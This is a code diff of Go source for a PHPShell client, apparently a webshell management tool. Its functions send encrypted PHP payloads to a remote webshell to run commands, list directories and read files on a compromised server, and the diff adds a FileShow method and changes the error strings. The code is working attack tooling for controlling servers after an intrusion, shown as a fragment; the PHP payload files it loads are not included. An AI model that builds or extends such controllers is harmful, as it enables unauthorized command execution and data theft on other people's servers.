@@ -33,7 +33,7 @@ func (s *PHPShell) FreshSession(id int, url string, password string) (string, er
 	log.Println("当前PHPSESSID " + session)
 	enResult, err := util.PostRequest(url, password, enCode, session)
 	if err != nil {
-		return "", err
+		return "HookPost error", err
 	}
 	// 解密code
 	res := util.Decrypt(enResult, password)
@@ -52,25 +52,9 @@ func (s *PHPShell) BaseInfo(id int, url string, password string) (string, error)
 
 	res, err := util.HookPost(url, password, string(code), PhpSessions[id])
 	if err != nil {
-		return "", err
+		return "HookPost error", err
 	}
 
-	return res, nil
-}
-
-// FileList lists all files in the current directory
-func (s *PHPShell) FileList(id int, path string, url string, password string) (string, error) {
-	code, err := os.ReadFile("./pkg/api/php/FileList.php")
-	if err != nil {
-		return "", err
-	}
-	code = fmt.Appendf(code, "\nmain(\"%s\");", path)
-
-	res, err := util.HookPost(url, password, string(code), PhpSessions[id])
-	if err != nil {
-		return "", err
-	}
-	// todo 解析结果
 	return res, nil
 }
 
@@ -86,7 +70,7 @@ func (s *PHPShell) ExecCommand(id int, command string, url string, password stri
 
 	osType, err := util.HookPost(url, password, string(code), PhpSessions[id])
 	if err != nil {
-		return "", err
+		return "HookPost error", err
 	}
 
 	// 2. base on the osType, execute the command
@@ -104,8 +88,37 @@ func (s *PHPShell) ExecCommand(id int, command string, url string, password stri
 
 	res, err := util.HookPost(url, password, string(code), PhpSessions[id])
 	if err != nil {
-		return "", err
+		return "HookPost error", err
 	}
 
+	return res, nil
+}
+
+// FileList lists all files in the current directory
+func (s *PHPShell) FileList(id int, path string, url string, password string) (string, error) {
+	code, err := os.ReadFile("./pkg/api/php/FileList.php")
+	if err != nil {
+		return "", err
+	}
+	code = fmt.Appendf(code, "\nmain(\"%s\");", path)
+
+	res, err := util.HookPost(url, password, string(code), PhpSessions[id])
+	if err != nil {
+		return "HookPost error", err
+	}
+	return res, nil
+}
+
+func (s *PHPShell) FileShow(id int, path string, url string, password string) (string, error) {
+	code, err := os.ReadFile("./pkg/api/php/FileShow.php")
+	if err != nil {
+		return "", err
+	}
+	code = fmt.Appendf(code, "\nmain(\"%s\");", path)
+
+	res, err := util.HookPost(url, password, string(code), PhpSessions[id])
+	if err != nil {
+		return "HookPost error", err
+	}
 	return res, nil
 }
